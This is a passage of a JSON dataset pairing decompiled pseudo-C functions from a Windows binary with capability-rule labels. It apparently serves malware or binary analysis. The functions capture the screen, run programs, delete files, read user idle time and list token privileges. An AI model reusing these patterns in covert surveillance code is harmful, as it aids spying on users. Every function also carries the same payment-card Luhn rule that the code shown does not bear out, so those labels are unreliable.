        "decompiled_code": "\nvoid fcn.004860c8(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4860e1;\n    fcn.004059cc();\n    puStack28 = 0x4860e9;\n    fcn.004059cc();\n    puStack28 = 0x4860f1;\n    fcn.004059cc();\n    uStack32 = 0x486179;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n    fcn.00405584();\n    fcn.00405530();\n    fcn.00405584();\n    fcn.00405584();\n    fcn.00405584();\n    uVar1 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00483c98, uVar1, 0, *0x495c30);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x486180);\n    return;\n}\n",
        "token_count": 312
    },
    "00487914": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __fastcall fcn.00487914(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 4;\n    do {\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x487935;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    var_8h = param_2;\n    fcn.004059cc();\n    var_1ch = 0x48793d;\n    fcn.004059cc();\n    var_20h = 0x487b3c;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00487914::var_24h;\n    puStack44 = 0x49f3b0;\n    puStack48 = 0x487955;\n    var_1ch = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack52 = 0x487b1a;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar1 = (**(**0x49f3ac + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f70();\n        *in_FS_OFFSET = puStack56;\n        puStack48 = 0x487b43;\n        puStack52 = 0x487b3b;\n        fcn.00405554();\n        return;\n    }\n    iVar1 = (**(**0x49f3ac + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x49f3ac + 0xc))();\n            puStack44 = &fcn.00487914::var_ch;\n            puStack48 = 0x4879b3;\n            fcn.00405b28();\n            puStack48 = 0x4879c3;\n            fcn.00405a44();\n            puStack48 = 0x4879d0;\n            fcn.00405b28();\n            puStack48 = 0x4879df;\n            fcn.00405a84();\n            puStack48 = &fcn.00487914::var_10h;\n            puStack52 = 0x4879f0;\n            fcn.00405b28();\n            puStack52 = 0x487a00;\n            fcn.00405a44();\n            puStack52 = 0x487a0d;\n            fcn.00405b28();\n            puStack52 = 0x487a1c;\n            fcn.00405a84();\n            puStack52 = &fcn.00487914::var_14h;\n            puStack56 = 0x487a2d;\n            fcn.00405b28();\n            puStack56 = 0x487a3d;\n            fcn.00405a44();\n            puStack56 = 0x487a4a;\n            fcn.00405b28();\n            puStack56 = 0x487a59;\n            fcn.00405a84();\n            puStack56 = &fcn.00487914::var_18h;\n            iVar2 = fcn.00405b28();\n            uVar3 = iVar2 == 1;\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            fcn.00405974();\n            if (uVar3) {\n                fcn.004055c8();\n                fcn.004058e0(var_1ch, 0x487b54, var_18h, 0x487b54, var_14h, 0x487b54, var_10h, 0x487b54, var_ch);\n                (**(**0x49f3ac + 0x20))();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack56;\n    puStack48 = 0x487b21;\n    puStack52 = 0x49f3b0;\n    puStack56 = 0x487b19;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 1172
    },
    "004880e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004880e4(uint arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    puStack44 = 0x488108;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack44 = 0x488110;\n    fcn.004059cc();\n    puStack44 = 0x488118;\n    fcn.004059cc();\n    puStack44 = 0x488120;\n    fcn.004059cc();\n    uStack48 = 0x488248;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack56 = 0x49f3b0;\n    puStack60 = 0x488138;\n    puStack44 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack64 = 0x488211;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack60 = &stack0xfffffffc;\n    cVar1 = fcn.00487b58();\n    if (cVar1 != '\\0') {\n        fcn.00404f70();\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x48824f;\n        uStack64 = 0x488232;\n        fcn.00405554();\n        uStack64 = 0x48823f;\n        fcn.00405554();\n        uStack64 = 0x488247;\n        fcn.00405530();\n        return;\n    }\n    fcn.004058e0(0x48826c, arg_8h, 0x488260, var_ch, 0x488260, var_8h, 0x488260, var_4h);\n    (**(**0x49f3ac + 0x38))();\n    puVar2 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x10);\n    uVar3 = fcn.00409ee4();\n    *puVar2 = uVar3;\n    fcn.00409b84();\n    fcn.00405584();\n    fcn.00409b84();\n    fcn.00405584();\n    puVar2[3] = 0;\n    uVar3 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.0048766c, puVar2, 0, &fcn.004880e4::var_14h);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar3;\n    sub.kernel32.dll_LeaveCriticalSection(0x49f3b0, 0x488218);\n    return;\n}\n",
        "token_count": 744
    },
    "00488270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00488270(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x488286;\n    fcn.004059cc();\n    uStack20 = 0x4882c7;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405864();\n    fcn.00475d98();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4882ce;\n    uStack20 = 0x4882c6;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 191
    },
    "00489230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00489230(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStackY156;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_20h;\n    \n    puStack108 = &stack0xfffffffc;\n    uStack112 = 0x48932c;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack116;\n    var_48h = 0x48;\n    iVar1 = sub.user32.dll_GetMonitorInfoA(arg_8h, &var_48h);\n    uVar2 = iVar1 == 0;\n    if (!uVar2) {\n        fcn.004057a0();\n        fcn.00405974();\n        if (uVar2) {\n            *0x49f3cc = var_44h;\n            *0x49f3d0 = var_40h;\n            fcn.00409d78(0x489344);\n            fcn.00409d78(0x489354, 0);\n            fcn.00409d78(0x489354, 0);\n            fcn.00409d78(0x489354, 0);\n            uStackY156 = 0;\n            fcn.004058e0();\n            fcn.00475d98();\n        }\n    }\n    *in_FS_OFFSET = uStackY156;\n    fcn.00405554(0x489333);\n    return;\n}\n",
        "token_count": 409
    },
    "004895b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004895b0(int32_t param_1, uint param_2)\n\n{\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack136;\n    uint uStack132;\n    uchar *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint var_50h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack100 = 0x4895cd;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack104 = 0x48979d;\n    iStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    uStack112 = 0;\n    uStack116 = 0;\n    uStack120 = 0;\n    uStack124 = 0x4895e9;\n    puStack100 = &stack0xfffffffc;\n    uStack124 = fcn.004059dc();\n    puStack128 = 0x4895ef;\n    hdc = sub.gdi32.dll_CreateDCA();\n    uStack132 = 0x489778;\n    iStack136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff78;\n    puStack128 = &stack0xfffffffc;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n    var_18h = sub.gdi32.dll_SelectObject();\n    sub.gdi32.dll_BitBlt();\n    puStack204 = 0x48966a;\n    var_1ch = fcn.0045faa4(unaff_EDI);\n    uStack208 = 0x489739;\n    iStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    puStack204 = &stack0xfffffffc;\n    if (param_1 != 100) {\n        puStack204 = &stack0xfffffffc;\n        fcn.0045fd64(0);\n    }\n    fcn.0045fc80();\n    var_20h = *0x49f3dc;\n    var_40h = 1;\n    var_3ch = **0x4958e8;\n    uStack60 = (*0x4958e8)[1];\n    uStack56 = (*0x4958e8)[2];\n    uStack52 = (*0x4958e8)[3];\n    var_28h = **0x495ccc;\n    var_2ch = 1;\n    var_24h = &fcn.004895b0::var_20h;\n    fcn.00420a8c(0);\n    fcn.00407024();\n    arg_8h = &fcn.004895b0::var_40h;\n    fcn.0045f9ac(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404650(0x489740);\n    return;\n}\n",
        "token_count": 823
    },
    "0048a380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048a380(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x48a396;\n    fcn.004059cc();\n    uStack20 = 0x48a3e4;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.0040f23c(0);\n    uVar1 = fcn.004059dc();\n    uVar1 = fcn.004059dc(uVar1);\n    uVar2 = 0;\n    sub.user32.dll_MessageBoxA_1(0, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48a3eb);\n    return;\n}\n",
        "token_count": 235
    },
    "0048a648": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0048a648(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x48a65e;\n    fcn.004059cc();\n    uStack20 = 0x48a6b5;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405864(0, 0);\n    uVar1 = fcn.004059dc();\n    uVar2 = 0;\n    sub.shell32.dll_ShellExecuteA(0, 0x48a6d4, 0x48a6cc, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48a6bc);\n    return;\n}\n",
        "token_count": 238
    },
    "0048a964": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0048a964(void)\n\n{\n    int32_t iVar1;\n    uint32_t auStack8 [2];\n    \n    auStack8[0] = 8;\n    sub.user32.dll_GetLastInputInfo(auStack8);\n    iVar1 = sub.kernel32.dll_GetTickCount_1();\n    return (iVar1 - auStack8[0]) / 1000 | auStack8[0] << 0x20;\n}\n",
        "token_count": 100
    },
    "0048a98c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048a98c(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = 0x48a9a0;\n    fcn.004059cc();\n    uStack44 = 0x48aa53;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x48aa33;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x48a9c8;\n    puStack40 = &stack0xfffffffc;\n    puVar2 = fcn.00404620();\n    uStack68 = 0x48aa22;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    cVar1 = fcn.0040a274();\n    if (cVar1 == '\\0') {\n        fcn.00404f70();\n        *in_FS_OFFSET = uStack72;\n        *in_FS_OFFSET = uStack60;\n        puStack52 = 0x48aa5a;\n        uStack56 = 0x48aa52;\n        fcn.00405530();\n        return;\n    }\n    fcn.0041beb0();\n    (***puVar2)();\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x48aa29;\n    uStack68 = 0x48aa21;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 456
    },
    "0048aa68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048aa68(uint param_1, uint param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint pExecInfo;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_4h;\n    \n    puStack80 = 0x48aa7d;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack84 = 0x48aaf4;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    fcn.00403af4();\n    pExecInfo = 0x3c;\n    var_3ch = 0x500;\n    var_30h = fcn.004059dc();\n    var_34h = 0x48ab04;\n    var_2ch = 0x48ab0c;\n    var_24h = 1;\n    sub.shell32.dll_ShellExecuteExA();\n    *in_FS_OFFSET = &fcn.0048aa68::pExecInfo;\n    uStack84 = 0x48aafb;\n    iStack88 = 0x48aaf3;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 332
    },
    "0048ab10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048ab10(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack512;\n    uint uStack508;\n    uchar *puStack504;\n    uint uStack500;\n    uint uStack496;\n    uchar *puStack492;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack504 = &stack0xfffffffc;\n    puStack492 = 0x48ab34;\n    fcn.004059cc();\n    uStack496 = 0x48ac07;\n    uStack500 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe0c;\n    uStack508 = 0x48abd0;\n    uStack512 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe00;\n    puStack492 = &stack0xfffffffc;\n    fcn.00405530();\n    fcn.00403770();\n    fcn.0040350c();\n    fcn.004033b8();\n    param_2 = param_2 + -2;\n    if (0 < param_2) {\n        do {\n            fcn.004033e0();\n            fcn.00405718();\n            fcn.00405818();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    fcn.00405cd0();\n    fcn.004040ac();\n    fcn.00403918();\n    *in_FS_OFFSET = uStack512;\n    *in_FS_OFFSET = uStack500;\n    puStack492 = 0x48ac0e;\n    uStack496 = 0x48abf9;\n    fcn.00405530();\n    uStack496 = 0x48ac06;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 427
    },
    "0048ac18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048ac18(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_28h;\n    uint lpFileOp;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint var_4h;\n    \n    puStack52 = 0x48ac2f;\n    fcn.004059cc();\n    uStack56 = 0x48aca0;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_1eh = 3;\n    fcn.00405864();\n    var_1ah = fcn.004059dc();\n    var_12h._0_2_ = 0x54;\n    sub.shell32.dll_SHFileOperationA();\n    *in_FS_OFFSET = &fcn.0048ac18::lpFileOp;\n    uStack56 = 0x48aca7;\n    iStack60 = 0x48ac97;\n    fcn.00405530();\n    iStack60 = 0x48ac9f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 301
    },
    "0048af7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048af7c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x48af8c;\n    fcn.004059cc();\n    uStack20 = 0x48afe2;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00421670();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421b84();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x48afe9;\n    uStack20 = 0x48afe1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 194
    },
    "0048b030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048b030(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48b045;\n    fcn.004059cc();\n    puStack20 = 0x48b04d;\n    fcn.004059cc();\n    uStack24 = 0x48b0ad;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00421670();\n    fcn.0042174c();\n    fcn.00421890();\n    uVar1 = 1;\n    fcn.004227c4(1);\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x48b0b4;\n    uStack28 = 0x48b0ac;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 240
    },
    "0048b300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048b300(void)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48b314;\n    fcn.004059cc();\n    uStack24 = 0x48b39a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x48b329;\n    puStack20 = &stack0xfffffffc;\n    fcn.00405530();\n    puStack32 = 0x48b331;\n    cVar1 = fcn.0040a274();\n    if (cVar1 != '\\0') {\n        uStack36 = 0x48b37d;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        piVar2 = fcn.00404620();\n        (**(*piVar2 + 0x68))();\n        (**(*piVar2 + 0x1c))();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x48b384;\n        uStack36 = 0x48b37c;\n        fcn.00404650();\n        return;\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x48b3a1;\n    uStack24 = 0x48b399;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 392
    },
    "0048b3a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delete file"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b3a8(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack20 = 0x48b3bc;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack20 = 0x48b3c4;\n    fcn.004059cc();\n    uStack24 = 0x48b457;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack36 = 0x48b435;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack44 = 0x48b3e8;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0040a274();\n    if (cVar1 != '\\0') {\n        uStack44 = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA();\n    }\n    var_ch = fcn.00404620();\n    (**(*var_ch + 0x2c))();\n    (**(*var_ch + 0x74))();\n    *in_FS_OFFSET = uStack44;\n    uStack36 = 0x48b43c;\n    uStack40 = 0x48b434;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 393
    },
    "0048b464": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.0048b464(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint ReturnLength;\n    int32_t *TokenInformation;\n    uint TokenHandle;\n    uint *var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x48b5b0;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    var_4h = in_EAX;\n    fcn.00405530();\n    TokenInformation = fcn.00402f00();\n    uVar1 = sub.kernel32.dll_GetCurrentProcess(0x28, &TokenHandle);\n    iVar2 = sub.advapi32.dll_OpenProcessToken(uVar1);\n    if (iVar2 == 0) {\n        fcn.0048a380();\n    }\n    iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, TokenInformation, 800, &ReturnLength);\n    if (iVar2 == 0) {\n        fcn.0048a380();\n    }\n    uVar1 = fcn.00402f00();\n    uVar3 = fcn.00402f00();\n    iVar2 = *TokenInformation;\n    if (-1 < iVar2 + -1) {\n        var_14h = 0;\n        do {\n            var_1ch = 0xff;\n            var_18h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, TokenInformation + var_14h * 3 + 1, uVar1, &var_18h);\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA(0, uVar1, uVar3, &var_1ch, &var_20h);\n            fcn.00405728(*var_4h);\n            fcn.00405728(0x48b60c, 0);\n            TokenHandle = 0x48b618;\n            fcn.004058e0();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00402f1c();\n    fcn.00402f1c();\n    fcn.00402f1c();\n    *in_FS_OFFSET = TokenHandle;\n    fcn.00405554(0x48b5b7);\n    return;\n}\n",
        "token_count": 618
    },
    "0048b838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.0048b838(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack100;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint ReturnLength;\n    uint TokenHandle;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x48b943;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    piVar1 = fcn.00402f00();\n    uVar2 = sub.kernel32.dll_GetCurrentProcess(0x28, &fcn.0048b838::TokenHandle);\n    iVar3 = sub.advapi32.dll_OpenProcessToken(uVar2);\n    if (iVar3 == 0) {\n        sub.kernel32.dll_Sleep_2(1);\n    }\n    uStack100 = 0x48b891;\n    iVar3 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, piVar1, 800, &fcn.0048b838::ReturnLength);\n    if (iVar3 == 0) {\n        uStack100 = 1;\n        sub.kernel32.dll_Sleep_2();\n    }\n    uVar2 = fcn.00402f00();\n    var_10h = fcn.00402f00();\n    iVar3 = *piVar1;\n    if (-1 < iVar3 + -1) {\n        var_ch = 0;\n        do {\n            var_14h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, piVar1 + var_ch * 3 + 1, uVar2, &fcn.0048b838::var_14h);\n            uStack100 = 0;\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA();\n            fcn.00405728();\n            fcn.0048b6f8();\n            var_ch = var_ch + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00402f1c();\n    fcn.00402f1c();\n    fcn.00402f1c();\n    *in_FS_OFFSET = uStack100;\n    fcn.00405530(0x48b94a);\n    return;\n}\n",
        "token_count": 570
    },
    "0048ba48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
